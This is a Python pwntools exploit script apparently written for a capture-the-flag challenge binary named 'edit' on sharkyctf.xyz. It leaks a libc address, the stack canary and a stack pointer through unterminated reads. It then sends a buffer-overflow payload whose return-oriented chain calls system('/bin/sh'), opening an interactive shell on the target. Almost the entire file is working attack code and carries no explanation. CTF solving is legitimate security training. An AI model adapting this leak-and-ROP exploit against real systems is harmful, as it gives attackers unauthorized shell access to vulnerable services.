from pwn import *
context.arch = 'amd64'

TARGET = './edit'
HOST = 'sharkyctf.xyz'
PORT = 20337

elf = ELF(TARGET)
def start():
    if not args.R:
        print "local"
        return process(TARGET)
        # return process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
        # return process(TARGET, stdout=process.PTY, stdin=process.PTY)
    else:
        print "remote"
        return remote(HOST, PORT)

def get_base_address(proc):
    return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    script += "set $_base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print "\t-> %s: 0x%x" % (val, eval(val))

r = start()

r.sendlineafter('\n> ', 'J')
# r.sendlineafter('\n> ', '3')
# r.sendlineafter('\n> ', 'W')
# r.sendlineafter('\n> ', 'T')
# r.sendlineafter('\n> ', 'Q')


r.sendlineafter('\n> ', '2')
r.sendafter(': ', 'A'*8)
r.recvuntil('A'*8)
leak = u64(r.recv(6)+'\x00'*2)
dbg("leak")
base = leak - 0x116591
dbg("base")
system = base + 0x4f440
binsh = base + 0x1b3e9a
rdi =  base + 0x0002155f

r.sendlineafter('(y/n)', 'n')

# payload = p64(0xdeadbeef) * (0x210/8)
payload = 'a'*0xa9
r.sendafter(': ', payload)
r.recvuntil('a'*0xa9)
canary = u64('\x00'+r.recv(7))
dbg("canary")

r.sendlineafter('(y/n)', 'n')


payload = 'b'*0xe8
r.sendafter(': ', payload)
r.recvuntil('b'*0xe8)
leak = u64(r.recv(6)+'\x00'*2)
dbg("leak")
stack = leak - 0x360
rbp = stack + 0x210
dbg("stack")
dbg("rbp")
# assert rbp & 0xff == 0x10
assert rbp & 0xf == 0

r.sendlineafter('(y/n)', 'n')
payload = ''
if leak & 0xff != 0:
    payload += 'A' * ((0x100-(stack & 0xff))-8)
else:
    payload += 'A' * 0xf8

payload += p64(canary) 
payload += p64(0xc0bebeef)
payload += p64(0xdeadbeef)

payload += '\x00'*0xe8

payload += p64(canary) 
payload += p64(0xc0bebeef)
payload += p64(rdi+1)
payload += p64(rdi)
payload += p64(binsh)
payload += p64(system)

payload = payload.ljust(0x208, '\x00')
payload += p64(canary)
assert payload > 0x210
# payload = 'A'*0x208
# payload += p64(canary)

r.sendafter(': ', payload)
# pause()
if args.D:
    context.log_level = 'debug'
    debug(r, [0x1dab, 0xb16,0x1cd0, 0xb35, 0x1019, 0x1dbe])

r.sendlineafter('(y/n)', 'y')
# r.sendlineafter('\n> ', '0000009')
r.interactive()

